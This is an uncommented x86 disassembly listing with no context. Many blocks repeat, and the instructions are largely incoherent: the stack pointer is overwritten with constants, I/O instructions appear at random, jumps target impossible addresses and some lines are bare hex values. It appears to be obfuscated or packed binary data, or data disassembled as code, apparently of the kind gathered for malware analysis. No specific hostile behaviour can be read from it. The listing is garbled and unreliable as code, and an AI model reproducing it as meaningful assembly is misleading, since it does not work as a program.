add [ esp + 0xc ] 0x6
sub esi 0x8a0f8677
jns r-xdata
call sub_40353d
sub ebx 0xa3642773
add ebx 0x9c575756
pop ecx
jae r-xdata
mov ecx 0x59054979
push esi
call sub_40356e
sub eax 0xc9811c71
xor eax 0x81247359
out dx eax
jns r-xdata
pop ecx
and ebx 0x1c7d5958
jae r-xdata
ja r-xdata
mov [ fs : 0x73bca279 ] eax
pop esp
pop edx
jns r-xdata
sub edx 0xee815d71
jg r-xdata
jge 0x18abaf8
pop ecx
jg r-xdata
sub ecx 0xce819d75
pop ecx
pop ecx
jg r-xdata
add esp 0x4
jae r-xdata
jmp [ 0xc4830f ]
jns r-xdata
jmp 0x1001d03
jne r-xdata
jpe 0x18c344da
jae r-xdata
add edx 0xffa5e89c
add [ eax ] al
call 0xffffffffcec17767
jno r-xdata
add ecx 0x8d0f3a7d
jne r-xdata
jae r-xdata
or eax 0x8d0fb671
jl 0xffffffffa1a4c783
jge r-xdata
xor esi 0xf04c483
xchg [ ebp - 0x7f000000 ] ebx
0x57e85254 0x0
ja r-xdata
pop edx
jg r-xdata
or ecx 0xea830f
add [ eax ] al
pop ecx
pop edx
ja r-xdata
ja 0xffffffffc2c1e8aa
pop eax
jae r-xdata
xor edx 0x9c579c55
call sub_40369c
mov edx 0xfb89c71
xchg [ edi + edi * 8 - 0x1 ] esp
inc [ ecx + 0xf3e7fc3 ]
test [ edi ] cl
mov [ edx - 0x1 ] eax
pop ecx
pop eax
pop eax
or esi 0x8b0f0a73
jne r-xdata
sub eax 0xf04c483
sub eax 0x81000000
into
pop edx
jae r-xdata
xor edi 0x5c775a59
pop ecx
pop edx
ja r-xdata
pop eax
jno r-xdata
add esp 0x4
ja r-xdata
jge 0x100b996
jns r-xdata
add esi 0x99870f
jne r-xdata
mov eax [ fs : 0xffffffffec835150 ]
adc al ch
push esp
jns r-xdata
or esi 0x890f537f
jge r-xdata
sub edx 0xf281e771
pop eax
jg r-xdata
jne 0xffffffffe7c223e0
add [ eax ] al
jae r-xdata
jbe 0xfffffffff2c1f83c
jae r-xdata
or esi 0x937f5959
jae r-xdata
add eax 0x81d97959
jmp 0xffffffffcec1d28e
jns r-xdata
xor esi 0x76795a59
jb 0x120b933
ja r-xdata
pop edx
jg r-xdata
or edx 0xf8810f
add [ eax ] al
jne r-xdata
mov edx 0xf08c483
sub [ edi + edi * 8 ] 0xffffffff
inc [ ecx + 0xfbf7ff2 ]
mov [ ecx + 0x73 ] ds
in al 0xd
pop edx
jno r-xdata
and ecx 0xff69830f
add [ eax ] al
ja r-xdata
mov edi 0xcf81337f
jns r-xdata
add [ eax ] al
add esi 0x7f585859
imul eax [ ecx - 0x6678f03a ] 0x0
jno r-xdata
xor eax 0xff56850f
jae r-xdata
sub edi 0xff5b8d0f
pop eax
jg r-xdata
sub esi 0x73b9397d
mov ebx 0x810f5a5a
pop edx
jae r-xdata
mov [ fs : 0xf08c483 ] eax
and [ ebp - 0x42000000 ] 0xffffff83
les eax [ edi + esi * 2 ]
mov ah 0xf
test [ ecx - 0x13 ] edi
and edi 0x7fbfe177
xor eax [ ecx + 0xf647dcf ]
lea edi [ ecx + 0x17 ]
jg r-xdata
jge 0xffffffffe1c14def
jae r-xdata
jpo 0x36288e35
jg r-xdata
jge 0xffffffffc009ab0e
jge r-xdata
add eax 0xe818ec83
cmpsb [ esi ] [ edi ]
ja r-xdata
jmp 0xffffffffe7288e85
ja r-xdata
sub eax 0x58bc3177
pop edx
add esp 0x4
jae r-xdata
pushfd
call sub_4036bf
call [ 0xfffffffff281d277 ]
je 0xffffffffff82bfeb
jae r-xdata
pop eax
pop eax
jns r-xdata
mov eax 0xca811073
jno r-xdata
add [ eax ] al
add [ ecx - 0x1f8ca535 ] al
jg r-xdata
jl 0xe24a8c7
jge r-xdata
pop edx
jno r-xdata
mov ecx 0x5abb3e73
jae r-xdata
jmp [ 0x182464ff ]
jae r-xdata
add ebx 0x840f3e7f
sub esp 0x18
call sub_4035ed
add edx 0x79810f59
add eax 0xff0e830f
jne r-xdata
jne 0x101ba9da
ja r-xdata
jmp [ 0xfffffffffee78f0f ]
add esp 0x4
jno r-xdata
add edx 0x81447158
0xf281e771 0x4079
pop ecx
jno r-xdata
sub ecx 0xa6810f5a
add [ eax ] al
add [ ecx + 0x5b8d0fef ] al
xchg edi eax
add [ eax ] al
add [ ecx + 0x585859c6 ] al
mov ebx 0x810f5a5a
jae r-xdata
jpo 0x5a9a8e4a
lea ecx [ edi ]
add eax 0x0
pushfd
push eax
call sub_4036f8
sub esi 0xe92e7f58
push esp
push edi
call sub_40361a
and eax 0xf0d2b73
xor ebp 0xfffffffe
mov esp 0xc4835a58
add al 0x73
dec eax
jge r-xdata
or esi 0xf0a735a
xchg [ ecx + 0x7f ] ebx
sbb ebp eax
jno r-xdata
jno 0xffffffffff13be65
jmp [ esp + 0x18 ]
or eax 0xfef5830f
jae r-xdata
jo 0xc647a5c
mov eax 0xff64870f
jge r-xdata
call sub_403530
sub eax 0xe48f0f5a
add [ eax ] al
add [ ecx + 0x775a59f7 ] al
pop esp
xor ecx 0x5656549c
sub esp 0x1c
jge r-xdata
push es
pop ecx
jno r-xdata
xor esi 0xe381807d
or eax 0x850f595a
test [ eax ] 0x0
add [ edi ] cl
mov [ ebx + 0xd ] dh
sub_40356e
jne r-xdata
jns r-xdata
call [ 0xffffffffea81cd7d ]
pop edx
jae r-xdata
jo 0xffffffffcec1551d
add [ esp + 0xc ] 0x6
sub esi 0x8a0f8677
pop edx
jne r-xdata
ja 0xffffffffe85bb449
add esp 0x4
jae r-xdata
jg r-xdata
jge 0x18abaf8
pop ecx
add eax 0xfefc8d0f
push esi
push edi
push edi
pushfd
jo 0xffffffffa0c14457
jae r-xdata
jae r-xdata
or eax 0x8d0fb671
jae r-xdata
add edx 0xffa5e89c
add [ eax ] al
pushfd
push esp
push esi
push esi
sub edi 0xad830f
add [ eax ] al
pop edx
jno r-xdata
mov esp 0x83ba5c73
les ecx [ eax ]
jae r-xdata
add [ eax ] al
add [ ecx + 0xfec75f6 ] al
jns r-xdata
or esi 0xf4f755a
sbb [ edx + 0xf ] 0x81
mov al [ 0xffffffff81000000 ]
div [ ebp - 0x14 ]
jns r-xdata
jmp 0x1001d03
pop eax
jae r-xdata
mov edi 0xf35f675
test [ esi - 0x1 ] edx
jge r-xdata
xor esi 0xf04c483
xchg [ ebp - 0x7f000000 ] ebx
0x57e85254 0x0
ja r-xdata
jns r-xdata
xor esi 0x8c0fec75
pop edx
pop ecx
jne r-xdata
xor edx 0x8c0fbf7f
jno r-xdata
mov esp 0xd2775a59
jne r-xdata
pop eax
jae r-xdata
xor edx 0x9c579c55
call sub_40369c
mov edx 0xfb89c71
xchg [ edi + edi * 8 - 0x1 ] esp
inc [ ecx + 0xf3e7fc3 ]
test [ edi ] cl
mov [ edx - 0x1 ] eax
pop ecx
pop eax
pop eax
or esi 0x8b0f0a73
push eax
push ecx
sub esp 0x10
call sub_40351f
jo 0xffffffffff29c2e0
or esi 0xf04c483
xor ebp 0xfffffffe
jae r-xdata
mov eax [ fs : 0x79b95e75 ]
dec ecx
jge r-xdata
js 0x59754211
jae r-xdata
or eax 0x15ff2875
jns r-xdata
call sub_40353d
sub ebx 0xa3642773
add ebx 0x9c575756
pop ecx
jae r-xdata
mov ecx 0x59054979
add esp 0x4
ja r-xdata
jge 0x100b996
jns r-xdata
add esi 0x99870f
push esi
call sub_40356e
sub eax 0xc9811c71
xor eax 0x81247359
out dx eax
jns r-xdata
pop ecx
and ebx 0x1c7d5958
jae r-xdata
ja r-xdata
mov [ fs : 0x73bca279 ] eax
pop esp
pop edx
jns r-xdata
sub edx 0xee815d71
pop ecx
jg r-xdata
sub ecx 0xce819d75
pop ecx
pop ecx
jg r-xdata
pop eax
jg r-xdata
jne 0xffffffffe7c223e0
add [ eax ] al
jae r-xdata
jbe 0xfffffffff2c1f83c
jmp [ 0xc4830f ]
jne r-xdata
jpe 0x18c344da
call 0xffffffffcec17767
jno r-xdata
add ecx 0x8d0f3a7d
jne r-xdata
jns r-xdata
xor esi 0x76795a59
jb 0x120b933
ja r-xdata
pop edx
jg r-xdata
or edx 0xf8810f
add [ eax ] al
jl 0xffffffffa1a4c783
pop edx
jg r-xdata
or ecx 0xea830f
add [ eax ] al
pop ecx
pop edx
ja r-xdata
ja 0xffffffffc2c1e8aa
pop edx
jno r-xdata
and ecx 0xff69830f
add [ eax ] al
ja r-xdata
mov edi 0xcf81337f
jns r-xdata
add [ eax ] al
add esi 0x7f585859
imul eax [ ecx - 0x6678f03a ] 0x0
jne r-xdata
sub eax 0xf04c483
sub eax 0x81000000
into
xor edi 0x5c775a59
pop ecx
pop edx
ja r-xdata
pop eax
jno r-xdata
jae r-xdata
sub edi 0xff5b8d0f
pop eax
jg r-xdata
sub esi 0x73b9397d
mov ebx 0x810f5a5a
pop edx
jae r-xdata
mov [ fs : 0xf08c483 ] eax
and [ ebp - 0x42000000 ] 0xffffff83
les eax [ edi + esi * 2 ]
mov ah 0xf
test [ ecx - 0x13 ] edi
and edi 0x7fbfe177
xor eax [ ecx + 0xf647dcf ]
lea edi [ ecx + 0x17 ]
jg r-xdata
jge 0xffffffffe1c14def
jae r-xdata
jpo 0x36288e35
jne r-xdata
mov eax [ fs : 0xffffffffec835150 ]
adc al ch
push esp
jns r-xdata
or esi 0x890f537f
jge r-xdata
sub edx 0xf281e771
jge r-xdata
add eax 0xe818ec83
cmpsb [ esi ] [ edi ]
ja r-xdata
jmp 0xffffffffe7288e85
ja r-xdata
sub eax 0x58bc3177
pop edx
add esp 0x4
jae r-xdata
pushfd
call sub_4036bf
call [ 0xfffffffff281d277 ]
je 0xffffffffff82bfeb
jae r-xdata
pop eax
pop eax
jns r-xdata
mov eax 0xca811073
jno r-xdata
add [ eax ] al
add [ ecx - 0x1f8ca535 ] al
jae r-xdata
or esi 0x937f5959
jae r-xdata
add eax 0x81d97959
jmp 0xffffffffcec1d28e
jge r-xdata
pop edx
jno r-xdata
mov ecx 0x5abb3e73
jae r-xdata
jmp [ 0x182464ff ]
jae r-xdata
add ebx 0x840f3e7f
sub esp 0x18
call sub_4035ed
add edx 0x79810f59
add eax 0xff0e830f
jne r-xdata
jne 0x101ba9da
ja r-xdata
jmp [ 0xfffffffffee78f0f ]
jne r-xdata
mov edx 0xf08c483
sub [ edi + edi * 8 ] 0xffffffff
inc [ ecx + 0xfbf7ff2 ]
mov [ ecx + 0x73 ] ds
in al 0xd
pop ecx
jno r-xdata
sub ecx 0xa6810f5a
add [ eax ] al
add [ ecx + 0x5b8d0fef ] al
xchg edi eax
add [ eax ] al
add [ ecx + 0x585859c6 ] al
mov ebx 0x810f5a5a
jae r-xdata
jpo 0x5a9a8e4a
lea ecx [ edi ]
add eax 0x0
pushfd
push eax
call sub_4036f8
sub esi 0xe92e7f58
push esp
push edi
call sub_40361a
and eax 0xf0d2b73
xor ebp 0xfffffffe
mov esp 0xc4835a58
add al 0x73
dec eax
jno r-xdata
xor eax 0xff56850f
jno r-xdata
jno 0xffffffffff13be65
jmp [ esp + 0x18 ]
or eax 0xfef5830f
jg r-xdata
jge 0xffffffffc009ab0e
mov eax 0xff64870f
jg r-xdata
jl 0xe24a8c7
add esp 0x4
jno r-xdata
add edx 0x81447158
0xf281e771 0x4079
jge r-xdata
or esi 0xf0a735a
xchg [ ecx + 0x7f ] ebx
sbb ebp eax
jae r-xdata
jo 0xc647a5c
jge r-xdata
call sub_403530
sub eax 0xe48f0f5a
add [ eax ] al
add [ ecx + 0x775a59f7 ] al
pop esp
xor ecx 0x5656549c
sub esp 0x1c
jge r-xdata
push es
pop ecx
jno r-xdata
xor esi 0xe381807d
pop eax
pop ecx
jge r-xdata
or eax 0x850f595a
test [ eax ] 0x0
add [ edi ] cl
mov [ ebx + 0xd ] dh
pop eax
jne r-xdata
mov eax [ fs : 0xffffffffff49890f ]
sub_4035ed
pop ecx
pop eax
pop edx
pop edx
pop ecx
pop eax
pop eax
or esi 0x8b0f0a73
jae r-xdata
jns r-xdata
add esi 0x99870f
jge r-xdata
xor esi 0xf04c483
xchg [ ebp - 0x7f000000 ] ebx
0x57e85254 0x0
jae r-xdata
jbe 0xfffffffff2c1f83c
pop eax
jae r-xdata
xor edx 0x9c579c55
call sub_40369c
mov edx 0xfb89c71
xchg [ edi + edi * 8 - 0x1 ] esp
inc [ ecx + 0xf3e7fc3 ]
test [ edi ] cl
mov [ edx - 0x1 ] eax
pop edx
jg r-xdata
or edx 0xf8810f
add [ eax ] al
add esp 0x4
ja r-xdata
jge 0x100b996
jns r-xdata
add [ eax ] al
add esi 0x7f585859
imul eax [ ecx - 0x6678f03a ] 0x0
pop eax
jg r-xdata
jne 0xffffffffe7c223e0
add [ eax ] al
jae r-xdata
jpo 0x36288e35
jns r-xdata
xor esi 0x76795a59
jb 0x120b933
ja r-xdata
pop eax
pop eax
jns r-xdata
mov eax 0xca811073
jno r-xdata
add [ eax ] al
add [ ecx - 0x1f8ca535 ] al
pop edx
jno r-xdata
and ecx 0xff69830f
add [ eax ] al
ja r-xdata
mov edi 0xcf81337f
ja r-xdata
jmp [ 0xfffffffffee78f0f ]
pop eax
jg r-xdata
sub esi 0x73b9397d
mov ebx 0x810f5a5a
sub esp 0x18
call sub_4035ed
add edx 0x79810f59
add eax 0xff0e830f
jae r-xdata
sub edi 0xff5b8d0f
pop edx
jae r-xdata
mov [ fs : 0xf08c483 ] eax
and [ ebp - 0x42000000 ] 0xffffff83
les eax [ edi + esi * 2 ]
mov ah 0xf
test [ ecx - 0x13 ] edi
and edi 0x7fbfe177
xor eax [ ecx + 0xf647dcf ]
lea edi [ ecx + 0x17 ]
jg r-xdata
jge 0xffffffffe1c14def
pushfd
push eax
call sub_4036f8
sub esi 0xe92e7f58
push esp
push edi
call sub_40361a
and eax 0xf0d2b73
xor ebp 0xfffffffe
mov esp 0xc4835a58
add al 0x73
dec eax
ja r-xdata
jmp 0xffffffffe7288e85
jge r-xdata
add eax 0xe818ec83
cmpsb [ esi ] [ edi ]
ja r-xdata
sub eax 0x58bc3177
pop edx
add esp 0x4
jae r-xdata
pushfd
call sub_4036bf
call [ 0xfffffffff281d277 ]
je 0xffffffffff82bfeb
jae r-xdata
jae r-xdata
jmp [ 0x182464ff ]
jge r-xdata
pop edx
jno r-xdata
mov ecx 0x5abb3e73
jae r-xdata
add ebx 0x840f3e7f
jne r-xdata
jne 0x101ba9da
pop ecx
jno r-xdata
sub ecx 0xa6810f5a
add [ eax ] al
add [ ecx + 0x5b8d0fef ] al
xchg edi eax
add [ eax ] al
add [ ecx + 0x585859c6 ] al
mov ebx 0x810f5a5a
jae r-xdata
jpo 0x5a9a8e4a
lea ecx [ edi ]
add eax 0x0
jno r-xdata
jno 0xffffffffff13be65
jmp [ esp + 0x18 ]
or eax 0xfef5830f
ja r-xdata
mov eax 0xff64870f
sub_40361a
pop ecx
pop edx
jns r-xdata
jge r-xdata
jb 0x120b933
jae r-xdata
or edx 0x59b9427f
add esp 0x8
ja r-xdata
add [ eax ] al
add esp 0x4
ja r-xdata
jpo 0xfcb90c
jns r-xdata
or esi 0xa5810f
add [ eax ] al
pop eax
jg r-xdata
sub esi 0x73b9397d
mov ebx 0x810f5a5a
jno r-xdata
sub edx 0x57e85254
add [ eax ] al
add [ ecx + 0x5a7f58c7 ] al
add [ eax ] al
add esp 0x8
jae r-xdata
and edi 0x7fbfe177
xor eax [ ecx + 0xf647dcf ]
lea edi [ ecx + 0x17 ]
jae r-xdata
jbe 0xfffffffff2c1f83c
ja r-xdata
jmp 0xffffffffe7288e85
jns r-xdata
add esi 0x99870f
ja r-xdata
add esi 0xc7817c73
add esp 0x4
jne r-xdata
mov ah 0xf
test [ ecx - 0x13 ] edi
mov esi 0x7704c483
pop edx
or edx 0xf8810f
add [ eax ] al
jae r-xdata
jmp [ 0x182464ff ]
jno r-xdata
and edx 0xff23870f
jae r-xdata
mov eax 0xe3795858
jns r-xdata
add [ eax ] al
add esi 0x7f585859
imul eax [ ecx - 0x6678f03a ] 0x0
pop ecx
jno r-xdata
sub ecx 0xa6810f5a
add [ eax ] al
add [ ecx + 0x5b8d0fef ] al
push esp
push edi
call sub_40361a
and eax 0xf0d2b73
xor ebp 0xfffffffe
add edi 0xff6e890f
jae r-xdata
jpo 0x36288e35
jno r-xdata
jno 0xffffffffff13be65
pop eax
pop eax
jns r-xdata
mov eax 0xca811073
add [ eax ] al
add [ ecx - 0x1f8ca535 ] al
ja r-xdata
mov eax 0xff64870f
ja r-xdata
jmp [ 0xfffffffffee78f0f ]
sub esp 0x18
call sub_4035ed
add edx 0x79810f59
add eax 0xff0e830f
ja r-xdata
mov edi 0xcf81337f
pushfd
push eax
call sub_4036f8
sub esi 0xe92e7f58
mov esp 0xc4835a58
add al 0x73
dec eax
pop edx
jae r-xdata
mov [ fs : 0xf08c483 ] eax
and [ ebp - 0x42000000 ] 0xffffff83
les eax [ edi + esi * 2 ]
jg r-xdata
jge 0xffffffffe1c14def
ja r-xdata
sub eax 0x58bc3177
pop edx
add esp 0x4
jae r-xdata
pushfd
call sub_4036bf
call [ 0xfffffffff281d277 ]
je 0xffffffffff82bfeb
jae r-xdata
jae r-xdata
add ebx 0x840f3e7f
jne r-xdata
jne 0x101ba9da
xchg edi eax
add [ eax ] al
add [ ecx + 0x585859c6 ] al
mov ebx 0x810f5a5a
jae r-xdata
jpo 0x5a9a8e4a
lea ecx [ edi ]
add eax 0x0
jmp [ esp + 0x18 ]
or eax 0xfef5830f
ja r-xdata
jg r-xdata
pop ecx
pop eax
pop eax
or esi 0x8b0f0a73
jae r-xdata
jge r-xdata
xor esi 0xf04c483
xchg [ ebp - 0x7f000000 ] ebx
0x57e85254 0x0
pop eax
jae r-xdata
xor edx 0x9c579c55
call sub_40369c
mov edx 0xfb89c71
xchg [ edi + edi * 8 - 0x1 ] esp
inc [ ecx + 0xf3e7fc3 ]
test [ edi ] cl
mov [ edx - 0x1 ] eax
add esp 0x4
ja r-xdata
jge 0x100b996
pop eax
jg r-xdata
jne 0xffffffffe7c223e0
add [ eax ] al
jns r-xdata
xor esi 0x76795a59
pop edx
jno r-xdata
and ecx 0xff69830f
jae r-xdata
sub edi 0xff5b8d0f
jge r-xdata
add eax 0xe818ec83
cmpsb [ esi ] [ edi ]
jge r-xdata
pop edx
jno r-xdata
mov ecx 0x5abb3e73
sub_40366a
jg r-xdata
pop ecx
add esp 0x8
ja r-xdata
or edi 0x8d0f647d
jns r-xdata
or esi 0xa5810f
add [ eax ] al
add esi 0xc7817c73
pop edx
jno r-xdata
and ecx 0xff69830f
add esp 0x8
jae r-xdata
and edi 0x7fbfe177
xor eax [ ecx + 0xf647dcf ]
lea edi [ ecx + 0x17 ]
jae r-xdata
jbe 0xfffffffff2c1f83c
jae r-xdata
sub edi 0xff5b8d0f
add esp 0x4
jne r-xdata
mov esi 0x7704c483
pop edx
or edx 0xf8810f
add [ eax ] al
jge r-xdata
add eax 0xe818ec83
cmpsb [ esi ] [ edi ]
jae r-xdata
mov eax 0xe3795858
jns r-xdata
mov ah 0xf
test [ ecx - 0x13 ] edi
add esi 0x7f585859
imul eax [ ecx - 0x6678f03a ] 0x0
jns r-xdata
add [ eax ] al
add esi 0x99870f
jge r-xdata
pop edx
jno r-xdata
mov ecx 0x5abb3e73
push esp
push edi
call sub_40361a
and eax 0xf0d2b73
xor ebp 0xfffffffe
add edi 0xff6e890f
jae r-xdata
jpo 0x36288e35
jg r-xdata
jge 0xffffffffe1c14def
pop eax
pop eax
jns r-xdata
mov eax 0xca811073
jno r-xdata
add [ eax ] al
add [ ecx - 0x1f8ca535 ] al
pushfd
call sub_4036bf
call [ 0xfffffffff281d277 ]
je 0xffffffffff82bfeb
jae r-xdata
ja r-xdata
jmp [ 0xfffffffffee78f0f ]
pop eax
jg r-xdata
sub esi 0x73b9397d
mov ebx 0x810f5a5a
sub esp 0x18
call sub_4035ed
add edx 0x79810f59
add eax 0xff0e830f
jne r-xdata
jne 0x101ba9da
pushfd
push eax
call sub_4036f8
sub esi 0xe92e7f58
mov esp 0xc4835a58
add al 0x73
dec eax
ja r-xdata
jmp 0xffffffffe7288e85
jae r-xdata
jpo 0x5a9a8e4a
lea ecx [ edi ]
add eax 0x0
jae r-xdata
jmp [ 0x182464ff ]
jmp [ esp + 0x18 ]
or eax 0xfef5830f
ja r-xdata
pop ecx
jno r-xdata
sub ecx 0xa6810f5a
add [ eax ] al
add [ ecx + 0x5b8d0fef ] al
jg r-xdata
pop ecx
pop eax
pop eax
or esi 0x8b0f0a73
jae r-xdata
jno r-xdata
jno 0xffffffffff13be65
jge r-xdata
xor esi 0xf04c483
xchg [ ebp - 0x7f000000 ] ebx
0x57e85254 0x0
ja r-xdata
mov eax 0xff64870f
pop eax
jae r-xdata
xor edx 0x9c579c55
call sub_40369c
mov edx 0xfb89c71
xchg [ edi + edi * 8 - 0x1 ] esp
inc [ ecx + 0xf3e7fc3 ]
test [ edi ] cl
mov [ edx - 0x1 ] eax
ja r-xdata
mov edi 0xcf81337f
add esp 0x4
ja r-xdata
jge 0x100b996
pop edx
jae r-xdata
mov [ fs : 0xf08c483 ] eax
and [ ebp - 0x42000000 ] 0xffffff83
les eax [ edi + esi * 2 ]
pop eax
jg r-xdata
jne 0xffffffffe7c223e0
add [ eax ] al
ja r-xdata
sub eax 0x58bc3177
pop edx
add esp 0x4
jae r-xdata
jns r-xdata
xor esi 0x76795a59
jb 0x120b933
jae r-xdata
add ebx 0x840f3e7f
add [ eax ] al
xchg edi eax
add [ eax ] al
add [ ecx + 0x585859c6 ] al
mov ebx 0x810f5a5a
sub_40369c
jg r-xdata
push ecx
push edi
call sub_40371c
or ebx 0x2de0735a
mov ecx 0x8c48359
ja r-xdata
pushfd
push eax
call sub_4036f8
sub esi 0xe92e7f58
mov esp 0xc4835a58
add al 0x73
dec eax
jns r-xdata
or esi 0xa5810f
add [ eax ] al
add esi 0xc7817c73
add esp 0x8
jae r-xdata
and edi 0x7fbfe177
xor eax [ ecx + 0xf647dcf ]
lea edi [ ecx + 0x17 ]
jae r-xdata
jbe 0xfffffffff2c1f83c
add esp 0x4
jne r-xdata
mov esi 0x7704c483
pop edx
or edx 0xf8810f
add [ eax ] al
jae r-xdata
mov eax 0xe3795858
jns r-xdata
mov ah 0xf
test [ ecx - 0x13 ] edi
add esi 0x7f585859
imul eax [ ecx - 0x6678f03a ] 0x0
jns r-xdata
add [ eax ] al
add esi 0x99870f
push esp
push edi
call sub_40361a
and eax 0xf0d2b73
xor ebp 0xfffffffe
add edi 0xff6e890f
jae r-xdata
jpo 0x36288e35
pop eax
pop eax
jns r-xdata
mov eax 0xca811073
jno r-xdata
add [ eax ] al
add [ ecx - 0x1f8ca535 ] al
ja r-xdata
jmp [ 0xfffffffffee78f0f ]
pop eax
jg r-xdata
sub esi 0x73b9397d
mov ebx 0x810f5a5a
sub esp 0x18
call sub_4035ed
add edx 0x79810f59
add eax 0xff0e830f
ja r-xdata
jmp 0xffffffffe7288e85
jae r-xdata
jmp [ 0x182464ff ]
pop ecx
jno r-xdata
sub ecx 0xa6810f5a
add [ eax ] al
add [ ecx + 0x5b8d0fef ] al
jno r-xdata
jno 0xffffffffff13be65
ja r-xdata
mov eax 0xff64870f
ja r-xdata
mov edi 0xcf81337f
pop edx
jae r-xdata
mov [ fs : 0xf08c483 ] eax
and [ ebp - 0x42000000 ] 0xffffff83
les eax [ edi + esi * 2 ]
jg r-xdata
jge 0xffffffffe1c14def
ja r-xdata
sub eax 0x58bc3177
pop edx
add esp 0x4
jae r-xdata
pushfd
call sub_4036bf
call [ 0xfffffffff281d277 ]
je 0xffffffffff82bfeb
jae r-xdata
jae r-xdata
add ebx 0x840f3e7f
jne r-xdata
jne 0x101ba9da
xchg edi eax
add [ eax ] al
add [ ecx + 0x585859c6 ] al
mov ebx 0x810f5a5a
jae r-xdata
jpo 0x5a9a8e4a
lea ecx [ edi ]
add eax 0x0
jmp [ esp + 0x18 ]
or eax 0xfef5830f
ja r-xdata
jg r-xdata
pop ecx
pop eax
pop eax
or esi 0x8b0f0a73
jae r-xdata
jge r-xdata
xor esi 0xf04c483
xchg [ ebp - 0x7f000000 ] ebx
0x57e85254 0x0
pop eax
jae r-xdata
xor edx 0x9c579c55
call sub_40369c
mov edx 0xfb89c71
xchg [ edi + edi * 8 - 0x1 ] esp
inc [ ecx + 0xf3e7fc3 ]
test [ edi ] cl
mov [ edx - 0x1 ] eax
add esp 0x4
ja r-xdata
jge 0x100b996
pop eax
jg r-xdata
jne 0xffffffffe7c223e0
add [ eax ] al
jns r-xdata
xor esi 0x76795a59
jb 0x120b933
pop edx
jno r-xdata
and ecx 0xff69830f
add [ eax ] al
jae r-xdata
sub edi 0xff5b8d0f
jge r-xdata
add eax 0xe818ec83
cmpsb [ esi ] [ edi ]
jge r-xdata
pop edx
jno r-xdata
mov ecx 0x5abb3e73
sub_4036f8
jae r-xdata
push esp
push edx
call sub_40366a
add edi 0x815a7f58
neg [ ecx + 0x5a ]
jns r-xdata
xor ebx 0x7504c483
stosb [ edi ]
jge r-xdata
jb 0x120b933
jae r-xdata
or edx 0x59b9427f
add esp 0x8
ja r-xdata
add [ eax ] al
add esp 0x4
ja r-xdata
jpo 0xfcb90c
jns r-xdata
or esi 0xa5810f
add [ eax ] al
pop eax
jg r-xdata
sub esi 0x73b9397d
mov ebx 0x810f5a5a
jno r-xdata
sub edx 0x57e85254
add [ eax ] al
add [ ecx + 0x5a7f58c7 ] al
add [ eax ] al
add esp 0x8
jae r-xdata
and edi 0x7fbfe177
xor eax [ ecx + 0xf647dcf ]
lea edi [ ecx + 0x17 ]
jae r-xdata
jbe 0xfffffffff2c1f83c
ja r-xdata
jmp 0xffffffffe7288e85
jns r-xdata
add esi 0x99870f
ja r-xdata
add esi 0xc7817c73
add esp 0x4
jne r-xdata
mov ah 0xf
test [ ecx - 0x13 ] edi
mov esi 0x7704c483
pop edx
or edx 0xf8810f
add [ eax ] al
jae r-xdata
jmp [ 0x182464ff ]
jno r-xdata
and edx 0xff23870f
jae r-xdata
mov eax 0xe3795858
jns r-xdata
add [ eax ] al
add esi 0x7f585859
imul eax [ ecx - 0x6678f03a ] 0x0
pop ecx
jno r-xdata
sub ecx 0xa6810f5a
add [ eax ] al
add [ ecx + 0x5b8d0fef ] al
push esp
push edi
call sub_40361a
and eax 0xf0d2b73
xor ebp 0xfffffffe
add edi 0xff6e890f
jae r-xdata
jpo 0x36288e35
jno r-xdata
jno 0xffffffffff13be65
pop eax
pop eax
jns r-xdata
mov eax 0xca811073
add [ eax ] al
add [ ecx - 0x1f8ca535 ] al
ja r-xdata
mov eax 0xff64870f
ja r-xdata
jmp [ 0xfffffffffee78f0f ]
sub esp 0x18
call sub_4035ed
add edx 0x79810f59
add eax 0xff0e830f
ja r-xdata
mov edi 0xcf81337f
pushfd
push eax
call sub_4036f8
sub esi 0xe92e7f58
mov esp 0xc4835a58
add al 0x73
dec eax
pop edx
jae r-xdata
mov [ fs : 0xf08c483 ] eax
and [ ebp - 0x42000000 ] 0xffffff83
les eax [ edi + esi * 2 ]
jg r-xdata
jge 0xffffffffe1c14def
ja r-xdata
sub eax 0x58bc3177
pop edx
add esp 0x4
jae r-xdata
pushfd
call sub_4036bf
call [ 0xfffffffff281d277 ]
je 0xffffffffff82bfeb
jae r-xdata
jae r-xdata
add ebx 0x840f3e7f
jne r-xdata
jne 0x101ba9da
xchg edi eax
add [ eax ] al
add [ ecx + 0x585859c6 ] al
mov ebx 0x810f5a5a
jae r-xdata
jpo 0x5a9a8e4a
lea ecx [ edi ]
add eax 0x0
jmp [ esp + 0x18 ]
or eax 0xfef5830f
ja r-xdata
jg r-xdata
pop ecx
pop eax
pop eax
or esi 0x8b0f0a73
jae r-xdata
jge r-xdata
xor esi 0xf04c483
xchg [ ebp - 0x7f000000 ] ebx
0x57e85254 0x0
pop eax
jae r-xdata
xor edx 0x9c579c55
call sub_40369c
mov edx 0xfb89c71
xchg [ edi + edi * 8 - 0x1 ] esp
inc [ ecx + 0xf3e7fc3 ]
test [ edi ] cl
mov [ edx - 0x1 ] eax
add esp 0x4
ja r-xdata
jge 0x100b996
pop eax
jg r-xdata
jne 0xffffffffe7c223e0
add [ eax ] al
jns r-xdata
xor esi 0x76795a59
pop edx
jno r-xdata
and ecx 0xff69830f
jae r-xdata
sub edi 0xff5b8d0f
jge r-xdata
add eax 0xe818ec83
cmpsb [ esi ] [ edi ]
jge r-xdata
pop edx
jno r-xdata
mov ecx 0x5abb3e73
sub_4037d3
pop edx
jns r-xdata
jne r-xdata
add ecx 0x54bf0a75
jne r-xdata
push ecx
call sub_4037d3
jmp [ 0x70246c83 ]
sub ebx 0x81f9795a
shl [ ebp + 0xa ] 0xbf
push esp
sub [ esp + 0x70 ] 0x2
sub esp 0x8
jge r-xdata
mov edi 0xf1e85154
jno r-xdata
add eax 0xe89c5656
add eax 0xb9000000
jae r-xdata
add ecx 0x53575255
call sub_40380b
jne 0xffffffffa3a51e7e
push esi
push esi
pushfd
call sub_4037fc
mov ecx 0xc1810d71
push ebp
push edx
push edi
push ebx
mov [ fs : 0xffffffff9c248481 ] eax
add [ eax ] al
add [ ecx - 0x7cffbfc8 ] bl
in al dx
add al 0x77
add eax 0xf0673e9
mov [ ebp + 0x9 ] esi
add edx 0x5e855
add [ eax ] al
mov ecx 0x850fef7f
jmp [ esp + 0xa8 ]
sub_40380b
add [ esp + 0x9c ] r-xdata
sub esp 0x4
ja r-xdata
jne r-xdata
jmp 0xffffffff894f3e93
jg r-xdata
add edx 0x5e855
add [ eax ] al
jae r-xdata
jne 0xffffffffa864dd32
mov ecx 0x850fef7f
push ebp
call sub_40382f
